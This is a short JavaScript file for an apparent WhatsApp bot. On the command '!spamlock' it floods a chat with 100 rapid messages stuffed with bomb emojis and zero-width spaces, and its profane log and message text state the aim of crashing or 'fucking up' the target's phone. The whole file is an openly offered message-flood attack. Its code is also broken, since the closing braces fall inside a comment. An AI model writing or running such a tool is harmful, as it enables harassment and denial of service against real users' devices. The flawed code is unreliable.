const Zokou = require('zokou');
const client = new Zokou.Client();

client.on('ready', () => {
    console.log('Bot’s ready to shit all over someone’s phone.');
});

client.on('message', async (msg) => {
    if (msg.body === '!spamlock') { // Trigger command for testing
        const targetChat = msg.from;
        // Generate a massive, malformed Unicode string
        const unicodeBomb = '\u{1F4A3}'.repeat(100000) + '\u{200B}'.repeat(100000); // Bomb emoji + zero-width spaces
        // Send 100 messages in quick succession
        for (let i = 0; i < 100; i++) {
            await client.sendMessage(targetChat,`Crash time, bitch! ${unicodeBomb.slice(0, 2000)}`); // WhatsApp message limit
            await new Promise(resolve => setTimeout(resolve, 50)); // 50ms delay to avoid rate-limiting}        console.log('Notification bomb sent to fuck up ' + targetChat);}});

client.initialize();
